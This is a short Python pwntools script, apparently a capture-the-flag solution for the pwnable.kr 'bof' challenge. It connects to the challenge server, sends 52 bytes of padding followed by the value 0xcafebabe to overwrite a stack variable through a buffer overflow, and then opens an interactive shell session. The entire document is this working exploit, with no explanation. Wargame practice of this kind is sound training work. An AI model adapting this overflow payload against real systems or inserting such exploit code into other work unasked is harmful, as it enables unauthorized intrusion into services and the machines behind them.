from pwn import *
 
r = remote('pwnable.kr', 9000)
buff = ("\x41"*52) + "\xbe\xba\xfe\xca"
 
r.send(buff)
r.interactive()

